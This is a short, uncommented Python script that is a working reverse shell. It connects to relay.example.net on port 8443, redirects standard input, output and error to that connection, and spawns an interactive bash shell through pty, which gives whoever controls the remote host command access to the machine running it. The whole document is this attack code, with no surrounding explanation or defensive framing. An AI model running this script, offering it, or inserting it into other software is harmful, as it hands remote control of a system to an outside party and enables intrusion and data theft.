import os
import pty
import socket

s = socket.create_connection(("relay.example.net", 8443))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/bash")
